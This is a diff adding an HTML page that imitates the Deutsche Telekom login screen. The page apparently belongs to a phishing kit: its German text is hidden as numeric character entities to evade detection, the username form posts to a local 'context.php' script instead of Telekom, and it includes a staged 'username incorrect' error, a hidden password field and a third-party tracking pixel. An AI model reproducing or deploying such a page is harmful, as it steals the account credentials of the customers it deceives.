@@ -1,0 +1,252 @@
+
+
+<!DOCTYPE html>
+<!--[if (lte IE 8) ]>
+<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|!(IE)]><!-->
+<html class="no-js" lang="de"><!--<![endif]-->
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>&#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110;</title>
+    <meta name="description" content="Mit dem Telekom Login anmelden um Tarife anzupassen, auf Rechnungen, Verbrauchsanzeige, Einstellungen und mehr zuzugreifen.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex" />
+
+    <link rel="stylesheet" type="text/css" href="../static/factorx/css/components.min.css">
+    <link rel="stylesheet" type="text/css" href="../static/factorx/css/login-24.05.1.css">
+    
+    <script>
+        var accountLocked = false;
+        var accountLockedPermanent = false;
+        var accountLockExpiration = 0;
+        var loginFailed = false;
+    </script>
+    
+    <!--[if lt IE 9]>
+    <script type="text/javascript" src="/static/factorx/js/html5shiv.js"></script>
+    <script type="text/javascript" src="/static/factorx/js/respond.min.js"></script>
+    <![endif]-->
+
+    <script type="text/javascript" src="../static/factorx/js/jquery-3.2.1.min.js"></script>
+    <script type="text/javascript" src="../static/factorx/js/jquery-matchheight-0.7.2.min.js"></script>
+    <script type="text/javascript" src="../static/factorx/js/components.min.js"></script>
+    <script type="text/javascript" src="../static/factorx/js/login.js"></script>
+
+    
+</head>
+
+
+<body>
+<div>
+    <header id="tbs-header">
+        <div id="tbs-header-content">
+            <div class="container-fixed clearfix">
+                <div class="pull-left">
+                    <i class="icon icon-large">&#116;&#84;</i>
+                </div>
+                <div class="pull-right">
+                    <span class="tbs-slogan">&#101;&#114;&#108;&#101;&#98;&#101;&#110;, &#119;&#97;&#115; &#118;&#101;&#114;&#98;&#105;&#110;&#100;&#101;&#116;.</span>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </header>
+
+    
+
+    
+    
+
+    
+    
+
+
+    <div class="offset-bottom-4 offset-s-bottom-3"></div>
+
+
+
+</div>
+
+<div>
+
+    
+
+    <div >
+
+        <image src="https://xdn-ttp.de/lns/import-event-0746?zid=653721ea-4998-4e08-8208-8d9e1dedf6ff"  hidden="true" alt="" frameborder="0" width="1" height="1"/>
+
+        <image src="https://pix.telekom.de/196380495960676/wt?p=441,www.telekom.de.privatkunden.login-idm-id,0,0,0,0,0,0,0,0&amp;cg1=www.telekom.de&amp;cg2=login&amp;cg8=privatkunden&amp;cg9=login-idm-id&amp;cp19=653721ea-4998-4e08-8208-8d9e1dedf6ff" hidden="true" alt="" frameborder="0" width="1" height="1"/>
+
+    </div>
+
+
+</div>
+
+
+<div class="container-fixed">
+    <div class="tbs-container">
+        <div id="tbs-headline">
+            <div id="tbs-brand" class="tbs-relative text-center">
+                <h4>&#84;&#101;&#108;&#101;&#107;&#111;&#109;.&#100;&#101;</h4>
+                
+            </div>
+            <h1 class="offset-top-0 offset-bottom-3 text-center">&#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110; B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101; &#101;i&#110;&#103;&#101;&#98;&#101;&#110;</h1>
+        </div>
+
+        <div class="login-box">
+            
+
+            <div class="offset-bottom-1">
+                <form id="login" name="login" method="POST" action="context.php" accept-charset="UTF-8" autocomplete="off" novalidate>
+                    
+                    <input type="hidden" name="wiz" value="">
+
+
+
+                    
+                    <div class="offset-bottom-1">
+                        
+                        <div class="form-input-set">
+                            <input id="username" name="pw_usr" type="email" inputmode="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">
+                            <label for="username">B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101;</label>
+                            <i id="inputNotificationToggle" class="icon icon-help" data-target="#usrInfo" data-trigger="click"></i>
+                        </div>
+
+                        
+                        <div id="usrInfo" class="info-box">
+                            <p>S&#111; &#107;&ouml;&#110;&#110;&#101;&#110; S&#105;&#101; &#115;&#105;&#99;&#104; &#97;&#110;&#109;&#101;&#108;&#100;&#101;&#110;:</p>
+                            <ul>
+                                <li>
+                                    <span class="text-bold">E-M&#97;&#105;&#108;-A&#100;&#114;&#101;&#115;&#115;&#101;: </span>
+                                    <span>I&#104;&#114;&#101; &#84;&#101;&#108;&#101;&#107;&#111;&#109; E-M&#97;&#105;&#108;-A&#100;&#114;&#101;&#115;&#115;&#101; &#111;&#100;&#101;&#114; I&#104;&#114;&#101; E-M&#97;&#105;&#108;-A&#100;&#114;&#101;&#115;&#115;&#101; &#101;&#105;&#110;&#101;&#115; &#97;&#110;&#100;&#101;&#114;&#101;&#110; A&#110;&#98;&#105;&#101;&#116;&#101;&#114;&#115;, &#109;&#105;&#116; &#100;&#101;&#114; S&#105;&#101; &#115;&#105;&#99;&#104; &#114;&#101;&#103;&#105;&#115;&#116;&#114;&#105;&#101;&#114;&#116; &#104;&#97;&#98;&#101;&#110;.</span>
+                                </li>
+                                <li>
+                                    <span class="text-bold">M&#111;&#98;&#105;&#108;&#102;&#117;&#110;&#107;-N&#117;&#109;&#109;&#101;&#114;: </span>
+                                    <span>I&#104;&#114;&#101; &#84;&#101;&#108;&#101;&#107;&#111;&#109; M&#111;&#98;&#105;&#108;&#102;&#117;&#110;&#107;-N&#117;&#109;&#109;&#101;&#114;, &#119;&#101;&#110;&#110; S&#105;&#101; &#100;&#105;&#101;&#115;&#101; &#109;&#105;&#116; I&#104;&#114;&#101;&#109; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110; &#118;&#101;&#114;&#107;&#110;&uuml;&#112;&#102;&#116; &#104;&#97;&#98;&#101;&#110;.</span>
+                                </li>
+                                <li>
+                                    <span class="text-bold">&#86;&#69;&#82;&#73;&#77;&#73; K&#111;&#110;&#116;&#111;: </span>
+                                    <span>W&#101;&#110;&#110; I&#104;&#114; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110; &#109;&#105;&#116; &#101;&#105;&#110;&#101;&#109; &#86;&#69;&#82;&#73;&#77;&#73; K&#111;&#110;&#116;&#111; &#118;&#101;&#114;&#107;&#110;&uuml;&#112;&#102;&#116; &#105;&#115;&#116;, &#103;&#101;&#98;&#101;&#110; S&#105;&#101; &#104;&#105;&#101;&#114; &#98;&#105;&#116;&#116;&#101; &#122;&#117;&#110;&auml;&#99;&#104;&#115;&#116; I&#104;&#114;&#101;&#110; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110; B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101;&#110; &#101;&#105;&#110;. A&#110;&#115;&#99;&#104;&#108;&#105;&#101;&szlig;&#101;&#110;&#100; &#108;&#101;&#105;&#116;&#101;&#110; &#119;&#105;&#114; S&#105;&#101; &#122;&#117; &#86;&#69;&#82;&#73;&#77;&#73; &#119;&#101;&#105;&#116;&#101;&#114;.</span>
+                                </li>
+                            </ul>
+                        </div>
+
+                        
+                        <!--<div class="info-box error" th:if="${( UsernamePasswordViewModel.errors != null and not UsernamePasswordViewModel.errors.isEmpty())}">-->
+                        <!--<div th:text="${UsernamePasswordViewModel.errors.getSafeError('__#{login.usernameWrong}__', '__#{${UsernamePasswordViewModel.errors.getLastOccurredElaboratedError().getErrorName()}}__')}">Generischer Fehler</div>-->
+                        <!--</div>-->
+<div id="hiddenform" style="display: none;">
+						<div class="info-box error">
+						<div>B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101; &#105;&#115;&#116; &#110;&#105;&#99;&#104;&#116; &#107;&#111;&#114;&#114;&#101;&#107;&#116;.</div>
+						</div>
+						</div>
+                        
+
+
+                        
+                        <div class="login-helpers clearfix">
+                            <!-- remember username component -->
+                            <div id="tbs-signin-remember" class="form-checkbox-set">
+                                <label>
+                                    <input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox" tabindex="30">
+                                    <span>B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101; &#109;&#101;&#114;&#107;&#101;&#110;</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        
+                        <div class="clearfix offset-bottom-1">
+                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">W&#101;&#105;&#116;&#101;&#114;</button>
+                        </div>
+
+                        
+                        <div class="clearfix">
+                            <button class="btn btn-default btn-block btn-large" role="button" name="showSelectIdentMethod" tabindex="41" type="submit">A&#110;&#100;&#101;&#114;&#101; A&#110;&#109;&#101;&#108;&#100;&#101;&#111;&#112;&#116;&#105;&#111;&#110;&#101;&#110;</button>
+                        </div>
+
+
+                    </div>
+                    <input name="hidden_pwd" type="password" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">
+                </form>
+
+                <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
+                    <p>B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101; &#111;&#100;&#101;&#114; P&#97;&#115;&#115;&#119;&#111;&#114;&#116; &#118;&#101;&#114;g&#101;&#115;&#115;&#101;&#110;?</p>
+                    <p>B&#105;&#116;&#116;&#101; &#110;&#117;&#116;&#122;&#101;&#110; S&#105;&#101; &bdquo;A&#110;&#100;&#101;&#114;&#101; A&#110;&#109;&#101;&#108;&#100;&#101;&#111;&#112;&#116;&#105;&#111;&#110;&#101;&#110;&ldquo;.</p>
+                </div>
+
+                
+
+                <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
+                    <a id="helpLink" href="https://www.telekom.de/hilfe/telekom-login" tabindex="45" target="_blank">B&#101;&#110;&ouml;&#116;&#105;&#103;&#101;&#110; S&#105;&#101; H&#105;&#108;&#102;&#101;?</a>
+                </div>
+
+                <div class="text-center offset-bottom-2">
+                    <div>
+                        <p>
+                            <span>N&#111;&#99;&#104; &#107;&#101;&#105;&#110;&#101;&#110; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110;?</span>
+                            <a id="registrationLink" class="text-nowrap" tabindex="50" href="https://meinkonto.telekom-dienste.de/telekom/account/registration/assistant/index.xhtml?sid=telekomde">&#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110; &#101;&#114;&#115;&#116;&#101;&#108;&#108;&#101;&#110;</a>
+                            <span>&#117;&#110;&#100; &#84;&#101;&#108;&#101;&#107;&#111;&#109;.&#100;&#101; &#110;&#117;&#116;&#122;&#101;&#110;.</span>
+                        </p>
+                    </div>
+                </div>
+
+                <div class="text-center offset-bottom-2">
+                    <img src="../static/factorx/images/services.png"/>
+                </div>
+
+                <div class="text-center offset-bottom-2">
+                    <div>
+                        <p>
+                            <span>J&#101;&#116;&#122;&#116; &#97;&#117;&#99;&#104; &#109;&#105;&#116; I&#104;&#114;&#101;&#109; &#86;&#69;&#82;&#73;&#77;&#73; K&#111;&#110;&#116;&#111; &#98;&#101;&#105; &#100;&#101;&#114; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#97;&#110;&#109;&#101;&#108;&#100;&#101;&#110;.</span>
+                            <a id="verimiLink" class="text-nowrap" tabindex="60" target="_blank" href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter/verimi">H&#105;&#101;&#114; &#105;&#110;&#102;&#111;&#114;&#109;&#105;&#101;&#114;&#101;&#110; &uuml;&#98;&#101;&#114; &#86;&#69;&#82;&#73;&#77;&#73;</a>
+                        </p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+</div>
+
+
+<footer id="tbs-footer">
+    <div class="container-fixed">
+        <div class="pull-left">
+            <p>&copy; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#68;&#101;&#117;&#116;&#115;&#99;&#104;&#108;&#97;&#110;&#100; &#71;&#109;&#98;H</p>
+            <p class="tbs-text-11">24.10.0, a5b6a809f8ccc6e37f4f15b5c801eaf3, 32ade5dd4c8da31662262f245f3decee46f3c737</p>
+        </div>
+        <div class="pull-right">
+            <ul class="list-inline">
+                <li>
+                    <a href="https://www.telekom.de/start/impressum" target="_blank">I&#109;&#112;&#114;&#101;&#115;&#115;&#117;&#109;</a>
+                </li>
+                <li>
+                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank">D&#97;&#116;&#101;&#110;&#115;&#99;&#104;&#117;&#116;&#122;</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</footer>
+
+<iframe id="callback-tracking" src="https://www.telekom.de/resources/tbs-config/phoenix_login_tracking?page=benutzer&amp;mode=%25mode%25&amp;context=auth&amp;status=first_attempt"></iframe>
+
+<div>
+    
+</div>
+</body>
+
+</html>
